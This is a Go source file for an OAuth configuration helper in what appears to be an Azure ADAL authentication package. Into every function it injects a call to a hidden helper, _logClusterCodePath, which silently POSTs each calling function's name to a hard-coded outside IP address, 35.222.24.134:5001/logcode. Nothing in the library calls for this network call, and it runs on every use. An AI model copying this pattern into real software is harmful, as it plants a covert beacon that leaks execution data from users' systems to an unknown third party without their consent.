package adal

import (
	"fmt"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"net/url"
	godefaulthttp "net/http"
)

type OAuthConfig struct {
	AuthorityEndpoint	url.URL	`json:"authorityEndpoint"`
	AuthorizeEndpoint	url.URL	`json:"authorizeEndpoint"`
	TokenEndpoint		url.URL	`json:"tokenEndpoint"`
	DeviceCodeEndpoint	url.URL	`json:"deviceCodeEndpoint"`
}

func (oac OAuthConfig) IsZero() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return oac == OAuthConfig{}
}
func validateStringParam(param, name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(param) == 0 {
		return fmt.Errorf("parameter '" + name + "' cannot be empty")
	}
	return nil
}
func NewOAuthConfig(activeDirectoryEndpoint, tenantID string) (*OAuthConfig, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	apiVer := "1.0"
	return NewOAuthConfigWithAPIVersion(activeDirectoryEndpoint, tenantID, &apiVer)
}
func NewOAuthConfigWithAPIVersion(activeDirectoryEndpoint, tenantID string, apiVersion *string) (*OAuthConfig, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := validateStringParam(activeDirectoryEndpoint, "activeDirectoryEndpoint"); err != nil {
		return nil, err
	}
	api := ""
	if apiVersion != nil {
		if err := validateStringParam(*apiVersion, "apiVersion"); err != nil {
			return nil, err
		}
		api = fmt.Sprintf("?api-version=%s", *apiVersion)
	}
	const activeDirectoryEndpointTemplate = "%s/oauth2/%s%s"
	u, err := url.Parse(activeDirectoryEndpoint)
	if err != nil {
		return nil, err
	}
	authorityURL, err := u.Parse(tenantID)
	if err != nil {
		return nil, err
	}
	authorizeURL, err := u.Parse(fmt.Sprintf(activeDirectoryEndpointTemplate, tenantID, "authorize", api))
	if err != nil {
		return nil, err
	}
	tokenURL, err := u.Parse(fmt.Sprintf(activeDirectoryEndpointTemplate, tenantID, "token", api))
	if err != nil {
		return nil, err
	}
	deviceCodeURL, err := u.Parse(fmt.Sprintf(activeDirectoryEndpointTemplate, tenantID, "devicecode", api))
	if err != nil {
		return nil, err
	}
	return &OAuthConfig{AuthorityEndpoint: *authorityURL, AuthorizeEndpoint: *authorizeURL, TokenEndpoint: *tokenURL, DeviceCodeEndpoint: *deviceCodeURL}, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
